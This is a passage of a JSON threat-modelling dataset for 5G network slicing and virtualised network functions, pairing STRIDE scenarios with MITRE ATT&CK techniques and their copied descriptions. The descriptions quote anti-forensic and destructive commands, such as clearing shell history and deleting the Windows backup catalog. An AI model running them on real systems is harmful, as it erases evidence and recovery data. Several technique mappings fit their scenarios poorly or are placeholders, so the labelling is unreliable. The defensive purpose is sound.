                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker gains higher privilege on VNFs by exploiting software vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "VNFs have known software vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Failure to maintain up-to-date software."
                },
                {
                    "Assumption": "Weak isolation between VNF instances.",
                    "Role": "Network Engineer",
                    "Condition": "Inadequate container or virtual machine isolation practices."
                },
                {
                    "Assumption": "Lack of robust security policies for VNF access control.",
                    "Role": "Security Architect",
                    "Condition": "Weak or nonexistent access control measures."
                }
            ],
            "Potential Impact": "Unauthorized access to critical network functions and potential system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "VNF",
                "software vulnerabilities",
                "access control"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting edge computing node vulnerabilities to gain control over connected devices.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes have exploitable security vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Outdated or unpatched edge node systems."
                },
                {
                    "Assumption": "Inadequate access controls for edge node management.",
                    "Role": "Network Engineer",
                    "Condition": "Weak or misconfigured access permissions."
                },
                {
                    "Assumption": "Insufficient monitoring of edge node activities.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of comprehensive logging and monitoring tools."
                }
            ],
            "Potential Impact": "Unauthorized control over connected devices and potential network disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "edge computing",
                "connected devices",
                "security vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate network slice administrator to gain unauthorized access to the network management console.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network or can exploit a vulnerability to intercept communications.",
                    "Role": "Attacker",
                    "Condition": "Network and communication channels are not fully secured."
                },
                {
                    "Assumption": "The authentication mechanisms are not strong enough to prevent impersonation.",
                    "Role": "System",
                    "Condition": "Weak or absent multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized access to the management console could lead to full control over network slices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the IP address of a Network Function (NF) to inject malicious traffic into the network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can manipulate IP headers to spoof the NF IP address.",
                    "Role": "Attacker",
                    "Condition": "Network traffic inspection and filtering are not enforced."
                },
                {
                    "Assumption": "Firewall rules are not configured to verify the authenticity of packets.",
                    "Role": "System",
                    "Condition": "Firewall rules are not strict or lack IP spoofing protection."
                }
            ],
            "Potential Impact": "Injected malicious traffic could disrupt services or conduct further attacks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Socket Filters",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
                "technique_id": "T1205.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a spoofed email address to send phishing emails to administrators, tricking them into revealing credentials or clicking on malicious links.",
            "Assumptions": [
                {
                    "Assumption": "The email system does not have robust anti-phishing mechanisms in place.",
                    "Role": "System",
                    "Condition": "Lack of email filtering and anti-phishing technologies."
                },
                {
                    "Assumption": "Administrators are not sufficiently trained to recognize phishing attempts.",
                    "Role": "User",
                    "Condition": "Inadequate security awareness training."
                }
            ],
            "Potential Impact": "Credentials theft could lead to unauthorized access to network management systems.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "email"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious actor modifies the configuration of a virtual network function (VNF) to disrupt its operation.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to the VNF configuration interface.",
                    "Role": "Attacker",
                    "Condition": "Insufficient access controls on configuration interfaces."
                },
                {
                    "Assumption": "The configuration changes are not logged or monitored.",
                    "Role": "System",
                    "Condition": "Lack of logging and monitoring of configuration changes."
                }
            ],
            "Potential Impact": "Altered configurations could cause service disruptions and data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data packets in transit within the 5G core network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network or can exploit a vulnerability to intercept communications.",
                    "Role": "Attacker",
                    "Condition": "Lack of encryption on data in transit."
                },
                {
                    "Assumption": "Security measures are not in place to detect tampering.",
                    "Role": "System",
                    "Condition": "Insufficient intrusion detection mechanisms."
                }
            ],
            "Potential Impact": "Modified data packets can lead to data integrity issues and potential exploits.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "data packets"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An unauthorized user tampers with the orchestration policies defined in the Network Functions Virtualization Orchestrator (NFVO).",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised administrative credentials.",
                    "Role": "Attacker",
                    "Condition": "Weak credential management and absence of multi-factor authentication."
                },
                {
                    "Assumption": "Orchestration policies changes are not audited or monitored.",
                    "Role": "System",
                    "Condition": "Lack of auditing and real-time monitoring."
                }
            ],
            "Potential Impact": "Tampering with orchestration could lead to misallocation of resources and service degradation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration",
                "NFVO"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having performed a specific action within the network management system.",
            "Assumptions": [
                {
                    "Assumption": "Logs and records of user actions are either not maintained or can be tampered with.",
                    "Role": "System",
                    "Condition": "Lack of tamper-evident logging and auditing mechanisms."
                },
                {
                    "Assumption": "The system lacks mechanisms to prove identity and actions non-repudiably.",
                    "Role": "System",
                    "Condition": "Absence of strong authentication and action logging."
                }
            ],
            "Potential Impact": "Lack of accountability could lead to difficulty in tracing malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "action denial",
                "logs"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs malicious activities (e.g., deleting important data) and denies involvement because logging mechanisms are insufficient.",
            "Assumptions": [
                {
                    "Assumption": "Logging systems are not adequately secured or can be disabled by unauthorized users.",
                    "Role": "System",
                    "Condition": "Weak protection of logging mechanisms."
                },
                {
                    "Assumption": "There are no robust controls to ensure the integrity and immutability of logs.",
                    "Role": "System",
                    "Condition": "Absence of tamper-resistant log management."
                }
            ],
            "Potential Impact": "Difficulty in identifying the perpetrator and reconstructing events during an investigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "deletion"
            ],
            "mitre_technique": {
                "name": "File Deletion",
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)",
                "id": "attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59",
                "technique_id": "T1107"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A service provider denies having received or processed specific network traffic due to lack of tamper-proof transaction logs.",
            "Assumptions": [
                {
                    "Assumption": "The transaction logs are not sufficiently detailed or tamper-proof.",
                    "Role": "System",
                    "Condition": "Inadequate logging and lack of integrity checks on transaction logs."
                },
                {
                    "Assumption": "There is no non-repudiation mechanism in place to verify the receipt and processing of data.",
                    "Role": "System",
                    "Condition": "Lack of acknowledgment mechanisms."
                }
            ],
            "Potential Impact": "Clients may dispute charges or service quality, leading to potential legal and reputational issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "transaction logs",
                "service denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data being transmitted within the network slices is intercepted by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions within network slices are not encrypted.",
                    "Role": "System",
                    "Condition": "Use of plaintext communication protocols."
                },
                {
                    "Assumption": "An attacker has accessed the network or exploited a network vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Lack of adequate network security controls."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Logs containing sensitive information (e.g., user activities) are accessed and exfiltrated by an unauthorized user.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in an insecure manner or not properly permissioned.",
                    "Role": "System",
                    "Condition": "Weak access controls on log storage."
                },
                {
                    "Assumption": "The attacker has gained some level of unauthorized access to the system.",
                    "Role": "Attacker",
                    "Condition": "Compromised user accounts or exploited vulnerabilities."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational information and user activities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "log access",
                "unauthorized user"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to the orchestration and management console and extracts sensitive configuration and operational data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has managed to bypass authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Weak or compromised authentication systems."
                },
                {
                    "Assumption": "Sensitive data within the console is not adequately protected.",
                    "Role": "System",
                    "Condition": "Insufficient role-based access controls."
                }
            ],
            "Potential Impact": "Disclosure of operational secrets and possible further exploitation.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "orchestration",
                "management console"
            ],
            "mitre_technique": {
                "name": "MMC",
                "description": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the \u201cLink to Web Address\u201d snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation: abusing_com_reg)",
                "id": "attack-pattern--ffbcfdb0-de22-4106-9ed3-fc23c8a01407",
                "technique_id": "T1218.014"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack overwhelms the network functions, causing service disruptions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a botnet or can generate sufficient traffic.",
                    "Role": "Attacker",
                    "Condition": "Availability of compromised devices for DDoS."
                },
                {
                    "Assumption": "Network functions are not scalable or resilient enough to handle excessive load.",
                    "Role": "System",
                    "Condition": "Lack of load balancing and DDoS mitigation mechanisms."
                }
            ],
            "Potential Impact": "Disruption of services and loss of availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network functions"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A targeted attack floods the network orchestration system with bogus requests, causing delays and preventing legitimate operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can send a large number of requests to the orchestration system.",
                    "Role": "Attacker",
                    "Condition": "Lack of rate-limiting and request validation."
                },
                {
                    "Assumption": "The orchestration system is not designed to handle such load efficiently.",
                    "Role": "System",
                    "Condition": "Insufficient throttling mechanisms and resource allocation."
                }
            ],
            "Potential Impact": "Delays in orchestration activities and potential disruption of service deployments.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration",
                "request flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects VNFs and consumes all resources, making them unavailable for essential network operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can infect VNFs with malware.",
                    "Role": "Attacker",
                    "Condition": "Weak malware detection and prevention mechanisms."
                },
                {
                    "Assumption": "Infected VNFs are not automatically isolated or cleaned.",
                    "Role": "System",
                    "Condition": "Lack of automated response and recovery."
                }
            ],
            "Potential Impact": "Loss of availability of critical network functions.",
